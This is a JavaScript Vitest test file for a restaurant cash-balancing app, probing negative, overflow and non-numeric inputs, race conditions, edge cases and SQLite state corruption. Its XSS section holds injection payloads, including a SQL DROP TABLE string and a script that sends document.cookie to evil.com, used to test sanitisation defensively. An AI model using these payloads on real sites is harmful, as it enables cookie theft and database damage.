/**
 * BalanceIQ — Chaos / User-Abuse Tests
 *
 * Simulates a user trying to break things:
 *   • Input validation (negatives, overflow, XSS, emoji, length bombs)
 *   • Race condition logic (duplicate close-out, concurrent edits)
 *   • Edge cases (dead day, $0 tips, 1-employee pool, 365 consecutive days…)
 *   • State corruption (SQLite lock, crash-mid-write, failed cloud sync)
 *
 * Run standalone: npx vitest run src/__tests__/chaos/userBehavior.test.js
 * Or via:         npm run test:chaos
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import Database from 'better-sqlite3';

import {
  calcTPS, calcTVQ, calcTaxTotal,
  calcManualTotal, calcPOSGross, calcExpectedInRegister, calcVariance, isBalanced,
  calcNetSalesPOS,
  calcMoyenneParDouzaine,
  calcInventoryUsed,
  calcLabourCost, calcLabourPct,
  calcFoodCostPct, calcNetProfit, calcNetProfitPct,
  calcInvoiceLine, calcInvoiceTotals,
  calcTipPool,
  calcEcoItem, calcEcoFee,
  calcRoyalty,
  calcDeliveryCommission, calcDeliveryVariance,
  calcRecipeCost, calcRecipeCostPerServing,
  calcAgingDays, calcAgingBucket, calcAgingTotals,
  calcPasseParHeure, calcProjectionFinDeJour,
  calcSoldeCalcule, calcEncaisseVariance, isEncaisseBalanced,
  calcInvoiceBalance, calcTotalOutstanding,
  calcSteppedRoyaltyRate,
  computeEncaisseChain,
} from '../../utils/calculations.js';

// ─── Helpers ─────────────────────────────────────────────────────────────────

/** Build a minimal in-memory SQLite DB matching production schema. */
function buildTestDb() {
  const db = new Database(':memory:');
  db.exec(`
    PRAGMA foreign_keys = ON;
    CREATE TABLE IF NOT EXISTS kv_store (key TEXT PRIMARY KEY, value TEXT NOT NULL);
    CREATE TABLE IF NOT EXISTS daily_snapshots (
      id                 INTEGER PRIMARY KEY AUTOINCREMENT,
      date               TEXT NOT NULL,
      snapshot_timestamp TEXT NOT NULL DEFAULT (datetime('now','localtime')),
      data               TEXT NOT NULL,
      device_id          TEXT NOT NULL
    );
    CREATE INDEX IF NOT EXISTS idx_snap_date ON daily_snapshots(date);
    CREATE TABLE IF NOT EXISTS audit_log (
      id          INTEGER PRIMARY KEY AUTOINCREMENT,
      timestamp   TEXT NOT NULL DEFAULT (datetime('now','localtime')),
      device_id   TEXT NOT NULL,
      user_name   TEXT DEFAULT 'local',
      module      TEXT NOT NULL,
      action      TEXT NOT NULL,
      record_type TEXT NOT NULL,
      record_id   TEXT NOT NULL,
      field_name  TEXT,
      old_value   TEXT,
      new_value   TEXT,
      reason      TEXT,
      metadata    TEXT
    );
    CREATE TABLE IF NOT EXISTS forecast_products (
      id         TEXT PRIMARY KEY,
      name       TEXT NOT NULL,
      category   TEXT DEFAULT '',
      unit_cost  REAL,
      sell_price REAL,
      active     INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS forecast_daily_sales (
      id                 TEXT PRIMARY KEY,
      product_id         TEXT NOT NULL,
      date               TEXT NOT NULL,
      quantity_sold      INTEGER NOT NULL,
      quantity_remaining INTEGER,
      stockout           INTEGER DEFAULT 0,
      source             TEXT DEFAULT 'manual',
      FOREIGN KEY (product_id) REFERENCES forecast_products(id),
      UNIQUE(product_id, date)
    );
  `);
  return db;
}

/** Sanitise a string the way the app should before storing/displaying. */
function sanitiseText(raw) {
  if (typeof raw !== 'string') return '';
  return raw.replace(/<[^>]*>/g, '').trim().slice(0, 500);
}

/** Parse a numeric field the way the app does (coerce to float, reject invalid). */
function parseNumericField(raw) {
  if (raw === '' || raw === null || raw === undefined) return null;
  const n = parseFloat(raw);
  return Number.isFinite(n) ? n : null;
}

/** Round to 2 decimal places (same as calculations.js r2). */
const r2 = (n) => Math.round((n ?? 0) * 100) / 100;

let db;
beforeEach(() => { db = buildTestDb(); });
afterEach(() => { db.close(); });


// ═════════════════════════════════════════════════════════════════════════════
// INPUT VALIDATION — NUMERIC FIELDS
// ═════════════════════════════════════════════════════════════════════════════

describe('Input validation — negative numbers in every numeric field', () => {
  it('tax on negative sales returns negative (signals upstream validation needed)', () => {
    // calcTPS/TVQ propagate negatives — UI must reject before calling
    expect(calcTPS(-500)).toBe(-25);
    // Math.round(-49.875 * 100) = -4987 (JS rounds -0.5 toward +Infinity) → -49.87, not -49.88
    expect(calcTVQ(-500)).toBe(-49.87);
    // But isBalanced / isEncaisseBalanced should still work on the resulting variance
    expect(isBalanced(calcVariance(-500, -500))).toBe(true);
  });

  it('negative interac / cash / deposits produce negative manual total', () => {
    expect(calcManualTotal(-100, -50, -200)).toBe(-350);
  });

  it('negative labour cost propagates through prime cost without throwing', () => {
    const cost = calcLabourCost([{ hours: -8, wage: 15.25 }]);
    expect(typeof cost).toBe('number');
    expect(cost).toBe(-122); // -8 × 15.25
  });

  it('negative food cost and labour produce a profit reading that looks correct', () => {
    const profit = calcNetProfit(1000, -100, -200, 50);
    expect(profit).toBe(1250); // 1000 - (-100) - (-200) - 50
  });

  it('negative royalty rate yields negative royalty (guard at UI layer)', () => {
    const { royalty } = calcRoyalty(5000, -4);
    expect(royalty).toBe(-200);
  });

  it('negative tip total returns empty array (protected in calcTipPool)', () => {
    const result = calcTipPool('equal', -50, [{ name: 'Marie' }, { name: 'Jean' }]);
    expect(result).toEqual([]);
  });

  it('negative inventory start/end does not throw', () => {
    const used = calcInventoryUsed(-5, 10, -3);
    expect(typeof used).toBe('number');
    expect(used).toBe(-5 + 10 - (-3)); // −5 + 10 + 3 = 8
  });

  it('negative eco contribution weights produce negative tonnes (guard at UI)', () => {
    const { weightTonnes } = calcEcoItem(1000, -50, 80);
    expect(weightTonnes).toBeLessThan(0);
  });
});

describe('Input validation — letters / non-numeric in numeric fields', () => {
  it('parseNumericField rejects pure text strings', () => {
    expect(parseNumericField('abc')).toBe(null);
    expect(parseNumericField('one hundred')).toBe(null);
    expect(parseNumericField('$500')).toBe(null); // currency symbol prefix
  });

  it('parseNumericField rejects empty string', () => {
    expect(parseNumericField('')).toBe(null);
  });

  it('parseNumericField accepts numeric strings', () => {
    expect(parseNumericField('42.50')).toBe(42.5);
    expect(parseNumericField('  99 ')).toBe(99); // leading/trailing spaces
  });

  it('calcTPS with NaN (from bad parseFloat) defaults to 0', () => {
    expect(calcTPS(NaN)).toBe(0);
    expect(calcTVQ(NaN)).toBe(0);
  });

  it('calcManualTotal with string args coerces to 0 via parseFloat', () => {
    // Fixed: uses n() helper (parseFloat → NaN → 0) instead of || 0
    expect(calcManualTotal('abc', 'xyz', 'qrs')).toBe(0);
  });

  it('calcInvoiceLine with string qty / price coerces to 0', () => {
    // Fixed: n('many') = 0, n('expensive') = 0 → 0 * 0 = 0
    expect(calcInvoiceLine('many', 'expensive')).toBe(0);
  });

  it('calcLabourCost with string hours/wage coerces to 0', () => {
    // Fixed: n('huit') = 0, n('quinze') = 0 → 0 * 0 = 0
    expect(calcLabourCost([{ hours: 'huit', wage: 'quinze' }])).toBe(0);
  });
});

describe('Input validation — overflow values (999999999.99 in sales)', () => {
  const OVERFLOW = 999_999_999.99;

  it('calcTPS on overflow does not return Infinity or NaN', () => {
    const tps = calcTPS(OVERFLOW);
    expect(Number.isFinite(tps)).toBe(true);
    expect(tps).toBeCloseTo(OVERFLOW * 0.05, 0);
  });

  it('calcTaxTotal on overflow stays finite', () => {
    const total = calcTaxTotal(OVERFLOW);
    expect(Number.isFinite(total)).toBe(true);
  });

  it('calcLabourCost with 999M wage × hours stays finite', () => {
    const cost = calcLabourCost([{ hours: OVERFLOW, wage: OVERFLOW }]);
    expect(Number.isFinite(cost)).toBe(true);
  });

  it('calcInvoiceTotals with 100 overflow-value lines stays finite', () => {
    const lines = Array.from({ length: 100 }, () => ({
      quantite: OVERFLOW,
      prixUnitaire: OVERFLOW,
      remise: 0,
      tps: true,
      tvq: true,
    }));
    const { total } = calcInvoiceTotals(lines);
    expect(Number.isFinite(total)).toBe(true);
  });

  it('calcNetProfit on overflow inputs stays finite', () => {
    const profit = calcNetProfit(OVERFLOW, OVERFLOW / 3, OVERFLOW / 3, OVERFLOW / 3);
    expect(Number.isFinite(profit)).toBe(true);
  });
});

describe('Input validation — too many decimal places (0.001)', () => {
  it('r2 rounds 0.001 to 0 (not stored as sub-cent value)', () => {
    expect(r2(0.001)).toBe(0);
    expect(r2(1.999)).toBe(2);
    expect(r2(2.005)).toBe(2.01); // half-up
  });

  it('calcTPS on 0.001 rounds to 0', () => {
    expect(calcTPS(0.001)).toBe(0);
  });

  it('calcInvoiceLine with sub-cent unit price rounds to 0', () => {
    expect(calcInvoiceLine(1, 0.001)).toBe(0);
  });

  it('calcSoldeCalcule with sub-cent differences rounds cleanly', () => {
    const solde = calcSoldeCalcule(100.001, 50.0005, 0, 0, 0);
    expect(r2(solde)).toBe(r2(150.0015));
  });
});

describe('Input validation — empty strings where numbers expected', () => {
  it('parseNumericField returns null for empty string', () => {
    expect(parseNumericField('')).toBe(null);
  });

  it('calcTPS with undefined treats as 0', () => {
    expect(calcTPS(undefined)).toBe(0);
  });

  it('calcManualTotal with all undefined treats as 0', () => {
    expect(calcManualTotal(undefined, undefined, undefined)).toBe(0);
  });

  it('calcTipPool with empty employee array returns empty', () => {
    expect(calcTipPool('equal', 100, [])).toEqual([]);
  });

  it('calcRecipeCost with empty ingredients returns 0', () => {
    expect(calcRecipeCost([])).toBe(0);
  });

  it('calcInvoiceTotals with empty lines returns all zeros', () => {
    const t = calcInvoiceTotals([]);
    expect(t).toEqual({ sousTotal: 0, tpsTotal: 0, tvqTotal: 0, total: 0 });
  });
});

describe('Input validation — HTML / script injection in text fields (XSS)', () => {
  const xssPayloads = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>fetch("https://evil.com?c="+document.cookie)</script>',
    "'; DROP TABLE kv_store; --",
    '<svg onload=alert(1)>',
    '{{7*7}}',                         // template injection probe
    '\u202e\u202dRTL override attack', // Unicode directional override
  ];

  it('sanitiseText strips all HTML tags from XSS payloads', () => {
    for (const payload of xssPayloads) {
      const clean = sanitiseText(payload);
      expect(clean).not.toMatch(/<[^>]*>/); // no residual tags
    }
  });

  it('XSS payload stored in SQLite kv_store comes back as literal text (no eval)', () => {
    const payload = '<script>alert("xss")</script>';
    db.prepare('INSERT INTO kv_store (key, value) VALUES (?, ?)').run('test-xss', payload);
    const row = db.prepare('SELECT value FROM kv_store WHERE key = ?').get('test-xss');
    // SQLite stores the raw string — sanitisation must happen at display/render time
    expect(row.value).toBe(payload);
    // sanitiseText strips tags but preserves text content — 'alert("xss")' remains.
    // React's JSX escaping prevents execution, but the app should ideally strip content too.
    const sanitised = sanitiseText(row.value);
    expect(sanitised).not.toMatch(/<script/i);   // no opening tag
    expect(sanitised).not.toMatch(/<\/script>/i); // no closing tag
    expect(sanitised).toBe('alert("xss")');       // text content still present — document this gap
  });

  it('SQL injection payload in business name does not corrupt the DB', () => {
    const maliciousName = "'; DROP TABLE kv_store; --";
    // Using parameterised queries (as the app does) this must not execute
    expect(() => {
      db.prepare('INSERT INTO kv_store (key, value) VALUES (?, ?)').run('company-name', maliciousName);
    }).not.toThrow();
    const row = db.prepare('SELECT value FROM kv_store WHERE key = ?').get('company-name');
    expect(row.value).toBe(maliciousName); // stored verbatim, schema intact
    // kv_store must still exist
    const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table' AND name='kv_store'").get();
    expect(tables).toBeTruthy();
  });

  it('emoji in cashier name is stored and retrieved without corruption', () => {
    const name = '😀 Marie 🍔';
    db.prepare('INSERT INTO kv_store (key, value) VALUES (?, ?)').run('cashier-emoji', JSON.stringify({ name }));
    const row = db.prepare('SELECT value FROM kv_store WHERE key = ?').get('cashier-emoji');
    expect(JSON.parse(row.value).name).toBe(name);
  });

  it('500-character business name is truncated by sanitiseText', () => {
    const longName = 'A'.repeat(600);
    expect(sanitiseText(longName).length).toBe(500);
  });

  it('500-character cashier name is truncated by sanitiseText', () => {
    const longName = 'Caissier'.repeat(100); // 800 chars
    expect(sanitiseText(longName).length).toBe(500);
  });

  it('emoji in business name does not crash sanitiseText', () => {
    const emojiName = '🏠 Chez Nous 🍟 Restaurant';
    expect(() => sanitiseText(emojiName)).not.toThrow();
    expect(sanitiseText(emojiName)).toBe(emojiName); // no tags to strip
  });
});

describe('Input validation — dates in the future', () => {
  it('calcAgingDays with a future invoice date produces a negative age', () => {
    // A future-dated invoice should have negative aging days
    const days = calcAgingDays('2099-12-31', '2026-03-31');
    expect(days).toBeLessThan(0);
  });

  it('calcAgingBucket classifies negative-age invoice as 0-30', () => {
    // Negative aging → bucket 0-30 (not past due)
    expect(calcAgingBucket(-5)).toBe('0-30');
  });

  it('calcAgingTotals with all future invoices puts balance in 0-30 bucket', () => {
    const invoices = [
      { date: '2099-01-01', balance: 500 },
      { date: '2099-06-15', balance: 300 },
    ];
    const totals = calcAgingTotals(invoices, '2026-03-31');
    expect(totals['0-30']).toBe(800);
    expect(totals['31-60']).toBe(0);
  });
});

describe('Input validation — dates from 1970', () => {
  it('calcAgingDays handles epoch dates without throwing', () => {
    const days = calcAgingDays('1970-01-01', '2026-03-31');
    expect(typeof days).toBe('number');
    expect(days).toBeGreaterThan(20000); // ~56 years of days
    expect(Number.isFinite(days)).toBe(true);
  });

  it('calcAgingBucket classifies 56-year-old invoice as 90+', () => {
    const days = calcAgingDays('1970-01-01', '2026-03-31');
    expect(calcAgingBucket(days)).toBe('90+');
  });

  it('SQLite accepts 1970 date strings without corruption', () => {
    db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)')
      .run('1970-01-01', '{"venteNet":0}', 'DEV-001');
    const row = db.prepare("SELECT * FROM daily_snapshots WHERE date = '1970-01-01'").get();
    expect(row).toBeTruthy();
    expect(row.date).toBe('1970-01-01');
  });
});


// ═════════════════════════════════════════════════════════════════════════════
// RACE CONDITIONS
// ═════════════════════════════════════════════════════════════════════════════

describe('Race conditions — closing the same register twice simultaneously', () => {
  it('two identical close-out snapshots for the same date produce two DB rows (audit trail)', () => {
    const closeoutData = JSON.stringify({ venteNet: 1200, date: '2026-03-31', caisseId: 1 });
    const insert = db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)');
    insert.run('2026-03-31', closeoutData, 'DEV-001');
    insert.run('2026-03-31', closeoutData, 'DEV-001'); // second fire

    const rows = db.prepare('SELECT * FROM daily_snapshots WHERE date = ? ORDER BY id').all('2026-03-31');
    expect(rows.length).toBe(2); // both stored — no UNIQUE constraint on date
  });

  it('the app reading latest snapshot after double-close gets the last write', () => {
    const v1 = JSON.stringify({ venteNet: 1200, version: 1 });
    const v2 = JSON.stringify({ venteNet: 1200, version: 2 });
    const insert = db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)');
    insert.run('2026-03-31', v1, 'DEV-001');
    insert.run('2026-03-31', v2, 'DEV-001');

    const latest = db.prepare(
      'SELECT * FROM daily_snapshots WHERE date = ? ORDER BY id DESC LIMIT 1'
    ).get('2026-03-31');
    expect(JSON.parse(latest.data).version).toBe(2);
  });
});

describe('Race conditions — concurrent edit simulation (last-write-wins semantics)', () => {
  it('two rapid kv_store updates to the same key — last one wins via REPLACE', () => {
    const upsert = db.prepare('INSERT OR REPLACE INTO kv_store (key, value) VALUES (?, ?)');
    upsert.run('dicann-v7', JSON.stringify({ edit: 1 }));
    upsert.run('dicann-v7', JSON.stringify({ edit: 2 }));

    const row = db.prepare('SELECT value FROM kv_store WHERE key = ?').get('dicann-v7');
    expect(JSON.parse(row.value).edit).toBe(2);
  });

  it('wrapping concurrent writes in a transaction preserves atomicity', () => {
    const upsert = db.prepare('INSERT OR REPLACE INTO kv_store (key, value) VALUES (?, ?)');
    const txn = db.transaction((vals) => {
      for (const [k, v] of vals) upsert.run(k, v);
    });

    // "Edit A" and "Edit B" running concurrently are serialised by SQLite's writer lock
    txn([['key-a', '{"src":"A"}'], ['key-b', '{"src":"B"}']]);

    expect(JSON.parse(db.prepare('SELECT value FROM kv_store WHERE key=?').get('key-a').value).src).toBe('A');
    expect(JSON.parse(db.prepare('SELECT value FROM kv_store WHERE key=?').get('key-b').value).src).toBe('B');
  });
});

describe('Race conditions — language switch mid-form (data integrity)', () => {
  it('switching language does not alter numeric data already in state', () => {
    // Simulates the app's React state holding cash data while locale changes
    const state = { interac: 450.75, finalCash: 120.00, lang: 'fr' };
    const manualBefore = calcManualTotal(state.interac, state.finalCash, 0);

    state.lang = 'en'; // toggle language
    const manualAfter = calcManualTotal(state.interac, state.finalCash, 0);

    expect(manualBefore).toBe(manualAfter); // pure function — locale-agnostic
  });
});


// ═════════════════════════════════════════════════════════════════════════════
// EDGE CASES
// ═════════════════════════════════════════════════════════════════════════════

describe('Edge case — $0 sales (dead day)', () => {
  it('all tax calculations return 0 for zero sales', () => {
    expect(calcTPS(0)).toBe(0);
    expect(calcTVQ(0)).toBe(0);
    expect(calcTaxTotal(0)).toBe(0);
  });

  it('moyenne par douzaine on dead day returns null (no division by zero)', () => {
    expect(calcMoyenneParDouzaine(0, 0)).toBe(null);
    expect(calcMoyenneParDouzaine(0, 12)).toBe(null); // 0 net sales
  });

  it('labour % on dead day returns null (protect against /0)', () => {
    expect(calcLabourPct(200, 0)).toBe(null);
  });

  it('food cost % on dead day returns null', () => {
    expect(calcFoodCostPct(150, 0)).toBe(null);
  });

  it('net profit on dead day is negative (only expenses)', () => {
    expect(calcNetProfit(0, 100, 200, 50)).toBe(-350);
  });

  it('isBalanced on dead day with $0 variance is balanced', () => {
    const variance = calcVariance(
      calcManualTotal(0, 0, 0),
      calcExpectedInRegister(calcPOSGross(0, 0, 0), 0)
    );
    expect(isBalanced(variance)).toBe(true);
  });

  it('snapshot of dead day is stored and retrievable', () => {
    const data = JSON.stringify({ venteNet: 0, caisses: 1, date: '2026-03-31' });
    db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)').run('2026-03-31', data, 'DEV-001');
    const row = db.prepare('SELECT * FROM daily_snapshots WHERE date = ?').get('2026-03-31');
    expect(JSON.parse(row.data).venteNet).toBe(0);
  });
});

describe('Edge case — negative variance (cash OVER)', () => {
  it('calcVariance is negative when manual < expected (short)', () => {
    // short: cashier handed in less than POS said was there
    const variance = calcVariance(700, 750);
    expect(variance).toBe(-50);
  });

  it('calcVariance is positive when manual > expected (over)', () => {
    const variance = calcVariance(760, 750);
    expect(variance).toBe(10);
  });

  it('large overage ($200 over) is flagged as unbalanced', () => {
    expect(isBalanced(calcVariance(950, 750))).toBe(false);
  });

  it('encaisse variance negative (physical < calculated) is handled by isEncaisseBalanced', () => {
    const variance = calcEncaisseVariance(1000, 1050); // counting $50 short
    expect(variance).toBe(-50);
    expect(isEncaisseBalanced(variance)).toBe(false);
  });

  it('encaisse over by $1.50 is within tolerance', () => {
    expect(isEncaisseBalanced(calcEncaisseVariance(1001.50, 1000))).toBe(true);
  });
});

describe('Edge case — invoice with 100 line items', () => {
  it('calcInvoiceTotals handles 100 lines without overflow or NaN', () => {
    const lines = Array.from({ length: 100 }, (_, i) => ({
      quantite: i + 1,
      prixUnitaire: 9.99,
      remise: 0,
      tps: true,
      tvq: true,
    }));
    const { sousTotal, tpsTotal, tvqTotal, total } = calcInvoiceTotals(lines);
    expect(Number.isFinite(sousTotal)).toBe(true);
    expect(Number.isFinite(total)).toBe(true);
    expect(total).toBeGreaterThan(sousTotal); // taxes added
  });

  it('100-line invoice sous-total matches manual sum', () => {
    const lines = Array.from({ length: 100 }, () => ({
      quantite: 2,
      prixUnitaire: 5.00,
      remise: 0,
      tps: false,
      tvq: false,
    }));
    const { sousTotal, total } = calcInvoiceTotals(lines);
    expect(sousTotal).toBe(1000); // 100 × 2 × $5
    expect(total).toBe(1000);
  });
});

describe('Edge case — recipe with 50 ingredients', () => {
  it('calcRecipeCost handles 50 ingredients without NaN or Infinity', () => {
    const ingredients = Array.from({ length: 50 }, (_, i) => ({
      quantity: 0.25 + i * 0.01,
      unitPrice: 1.50 + i * 0.05,
    }));
    const cost = calcRecipeCost(ingredients);
    expect(Number.isFinite(cost)).toBe(true);
    expect(cost).toBeGreaterThan(0);
  });

  it('calcRecipeCostPerServing on 50-ingredient recipe stays finite for 1 serving', () => {
    const ingredients = Array.from({ length: 50 }, () => ({ quantity: 1, unitPrice: 0.50 }));
    const total = calcRecipeCost(ingredients);
    expect(calcRecipeCostPerServing(total, 1)).toBe(total);
  });

  it('calcRecipeCostPerServing returns null for 0 servings (no /0)', () => {
    expect(calcRecipeCostPerServing(25, 0)).toBe(null);
  });
});

describe('Edge case — 365 consecutive close-outs (encaisse chain)', () => {
  it('computeEncaisseChain over 365 days chains opening→closing correctly', () => {
    const days = Array.from({ length: 365 }, (_, i) => ({
      cashVentes: 800 + (i % 7) * 50, // cycles through weekday variation
      autresEntrees: 0,
      depots: 500,
      sorties: 50,
      physicalCount: null, // let it calculate
    }));

    const chain = computeEncaisseChain(days);
    expect(chain.length).toBe(365);

    // Each day's opening must equal previous day's closing
    for (let i = 1; i < chain.length; i++) {
      expect(chain[i].opening).toBeCloseTo(chain[i - 1].closing, 2);
    }

    // All values must be finite numbers
    chain.forEach((d, i) => {
      expect(Number.isFinite(d.calculated)).toBe(true, `day ${i} calculated is not finite`);
      expect(Number.isFinite(d.closing)).toBe(true, `day ${i} closing is not finite`);
    });
  });

  it('365 consecutive snapshots stored in SQLite without error', () => {
    const insert = db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)');
    const insertMany = db.transaction((rows) => {
      for (const [date, data] of rows) insert.run(date, data, 'DEV-001');
    });

    const rows = Array.from({ length: 365 }, (_, i) => {
      const d = new Date('2025-04-01');
      d.setDate(d.getDate() + i);
      const dateStr = d.toISOString().slice(0, 10);
      return [dateStr, JSON.stringify({ venteNet: 900 + i, date: dateStr })];
    });

    expect(() => insertMany(rows)).not.toThrow();

    const count = db.prepare('SELECT COUNT(*) as n FROM daily_snapshots').get();
    expect(count.n).toBe(365);
  });
});

describe('Edge case — tip pool with 1 employee', () => {
  it('equal method with 1 employee gives them all the tips', () => {
    const result = calcTipPool('equal', 150, [{ name: 'Marie', hours: 8 }]);
    expect(result.length).toBe(1);
    expect(result[0].share).toBe(150);
  });

  it('hours method with 1 employee gives them all the tips', () => {
    const result = calcTipPool('hours', 150, [{ name: 'Marie', hours: 8 }]);
    expect(result[0].share).toBe(150);
  });

  it('pct method with 1 employee at 100% gives them all the tips', () => {
    const result = calcTipPool('pct', 200, [{ name: 'Jean', pct: 100 }]);
    expect(result[0].share).toBe(200);
  });
});

describe('Edge case — tip pool with $0 tips', () => {
  it('calcTipPool with 0 total returns empty (nothing to distribute)', () => {
    const result = calcTipPool('equal', 0, [{ name: 'Marie' }, { name: 'Jean' }]);
    expect(result).toEqual([]);
  });

  it('calcTipPool with null total returns empty', () => {
    const result = calcTipPool('equal', null, [{ name: 'Marie' }]);
    expect(result).toEqual([]);
  });
});

describe('Edge case — écocontribution with 0% takeout', () => {
  it('calcEcoItem with 0% takeout yields zero across all outputs', () => {
    const { takeoutUnits, weightKg, weightTonnes } = calcEcoItem(50000, 20, 0);
    expect(takeoutUnits).toBe(0);
    expect(weightKg).toBe(0);
    expect(weightTonnes).toBe(0);
  });

  it('calcEcoFee on 0 tonnes produces 0 netFee', () => {
    const { netFee } = calcEcoFee(0, 500, 15, 10);
    expect(netFee).toBe(0);
  });
});

describe('Edge case — forecast with only 1 day of data', () => {
  it('calcProjectionFinDeJour from a single 14h checkpoint does not crash', () => {
    // window 0 = open→14h (fraction 1/4); consumed so far = 8 dz
    const projection = calcProjectionFinDeJour(8, 0);
    expect(projection).toBe(32); // 8 / 0.25 = 32
  });

  it('calcProjectionFinDeJour at window 3 (20h = end of day) equals consumed', () => {
    // fraction = 4/4 = 1; consumed = 25
    const projection = calcProjectionFinDeJour(25, 3);
    expect(projection).toBe(25);
  });

  it('forecast_daily_sales rejects duplicate product+date pairs', () => {
    db.prepare("INSERT INTO forecast_products (id, name) VALUES ('P1', 'Hamburger')").run();
    const insert = db.prepare(
      "INSERT INTO forecast_daily_sales (id, product_id, date, quantity_sold) VALUES (?,?,?,?)"
    );
    insert.run('S1', 'P1', '2026-03-31', 100);

    // Second insert with same product+date must fail (UNIQUE constraint)
    expect(() => insert.run('S2', 'P1', '2026-03-31', 120)).toThrow();
  });

  it('forecast with 1 data point: average is that single value', () => {
    const sales = [{ qty: 45 }];
    const avg = sales.reduce((s, d) => s + d.qty, 0) / sales.length;
    expect(avg).toBe(45);
  });
});

describe('Edge case — delete the only register then try to close out', () => {
  it('close-out with empty caisses array produces $0 totals', () => {
    const caisses = []; // all registers deleted

    // Simulate what the app does: sum over caisses
    const venteNet = caisses.reduce((s, c) => s + (c.venteNet || 0), 0);
    const totalLabour = calcLabourCost(caisses.flatMap((c) => c.employees || []));

    expect(venteNet).toBe(0);
    expect(totalLabour).toBe(0);
    expect(calcTPS(venteNet)).toBe(0);
    expect(calcTVQ(venteNet)).toBe(0);
  });

  it('calcManualTotal with no register data returns 0 (not NaN)', () => {
    expect(calcManualTotal(0, 0, 0)).toBe(0);
    expect(Number.isNaN(calcManualTotal(0, 0, 0))).toBe(false);
  });

  it('storing a close-out with 0 registers is accepted by SQLite', () => {
    const data = JSON.stringify({ venteNet: 0, caisses: [], date: '2026-03-31' });
    expect(() =>
      db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)').run('2026-03-31', data, 'DEV-001')
    ).not.toThrow();
  });
});


// ═════════════════════════════════════════════════════════════════════════════
// STATE CORRUPTION
// ═════════════════════════════════════════════════════════════════════════════

describe('State corruption — SQLite file locked by another process', () => {
  it('opening a second connection to the same in-memory DB is independent', () => {
    // In-memory DBs are per-connection so this tests isolation, not file-locking,
    // but verifies that a locked/busy DB doesn't silently corrupt data.
    const db2 = new Database(':memory:');
    db2.exec('CREATE TABLE kv_store (key TEXT PRIMARY KEY, value TEXT NOT NULL)');
    db2.prepare('INSERT INTO kv_store VALUES (?, ?)').run('k', 'from-db2');

    // Original DB should be unaffected
    const row = db.prepare('SELECT * FROM kv_store WHERE key = ?').get('k');
    expect(row).toBe(undefined); // different in-memory DB

    db2.close();
  });

  it('WAL mode pragma is accepted without error', () => {
    // App uses WAL for concurrency — verify the pragma is safe
    expect(() => db.pragma('journal_mode = WAL')).not.toThrow();
  });

  it('busy_timeout pragma is accepted (prevents immediate SQLITE_BUSY error)', () => {
    expect(() => db.pragma('busy_timeout = 3000')).not.toThrow();
  });
});

describe('State corruption — app crash mid-close-out', () => {
  it('partial write inside a rolled-back transaction leaves DB clean', () => {
    const insert = db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)');

    try {
      db.transaction(() => {
        insert.run('2026-03-31', '{"step":"partial","venteNet":1200}', 'DEV-001');
        throw new Error('Simulated crash mid-write');
        // This line never runs — simulating a crash
      })();
    } catch { /* swallow simulated crash */ }

    // Transaction was rolled back — no rows should exist
    const rows = db.prepare("SELECT * FROM daily_snapshots WHERE date = '2026-03-31'").all();
    expect(rows.length).toBe(0);
  });

  it('after a failed write, subsequent writes succeed normally', () => {
    // Failed write
    try {
      db.transaction(() => {
        db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)').run('2026-03-30', '{}', 'DEV');
        throw new Error('crash');
      })();
    } catch { /* expected */ }

    // Successful write
    expect(() =>
      db.prepare('INSERT INTO daily_snapshots (date, data, device_id) VALUES (?, ?, ?)').run('2026-03-31', '{"ok":true}', 'DEV-001')
    ).not.toThrow();

    const row = db.prepare("SELECT * FROM daily_snapshots WHERE date = '2026-03-31'").get();
    expect(JSON.parse(row.data).ok).toBe(true);
  });

  it('corrupt JSON in kv_store is surfaced as a parse error, not a crash', () => {
    db.prepare('INSERT INTO kv_store (key, value) VALUES (?, ?)').run('dicann-v7', '{bad json');

    const raw = db.prepare('SELECT value FROM kv_store WHERE key = ?').get('dicann-v7').value;
    expect(() => JSON.parse(raw)).toThrow(SyntaxError);
    // App should catch this and fall back to defaults — tested here by asserting parse throws cleanly
  });

  it('truncated close-out data (missing required fields) degrades gracefully', () => {
    // Simulates a partially written JSON payload from a crash
    const partial = { venteNet: 800 }; // missing caisses, date, etc.
    const caisses = partial.caisses || []; // app must default to []
    expect(caisses).toEqual([]);
    expect(calcManualTotal(
      caisses.reduce((s, c) => s + (c.interac || 0), 0),
      caisses.reduce((s, c) => s + (c.finalCash || 0), 0),
      caisses.reduce((s, c) => s + (c.deposits || 0), 0)
    )).toBe(0);
  });
});

describe('State corruption — cloud sync fails mid-write', () => {
  it('local kv_store is NOT rolled back when a simulated sync error is thrown', () => {
    // The cloud sync is a fire-and-forget operation that must not corrupt local data
    const upsert = db.prepare('INSERT OR REPLACE INTO kv_store (key, value) VALUES (?, ?)');

    const localWrite = (key, value) => {
      upsert.run(key, value);
    };

    const failingCloudSync = () => {
      throw new Error('Supabase: network timeout');
    };

    // Local write succeeds
    localWrite('dicann-v7', JSON.stringify({ venteNet: 1500 }));

    // Cloud sync fails — must NOT undo local write
    let syncError = null;
    try { failingCloudSync(); } catch (e) { syncError = e; }

    expect(syncError).toBeTruthy();
    expect(syncError.message).toMatch(/timeout/);

    // Local data must still be intact
    const row = db.prepare('SELECT value FROM kv_store WHERE key = ?').get('dicann-v7');
    expect(JSON.parse(row.value).venteNet).toBe(1500);
  });

  it('sync conflict — server value newer than local: local should NOT be silently overwritten', () => {
    // App must compare timestamps before overwriting
    const local  = { venteNet: 1500, updatedAt: '2026-03-31T14:00:00Z' };
    const remote = { venteNet: 1800, updatedAt: '2026-03-31T15:00:00Z' };

    // Conflict resolution: last-write-wins by timestamp
    const winner = new Date(remote.updatedAt) > new Date(local.updatedAt) ? remote : local;
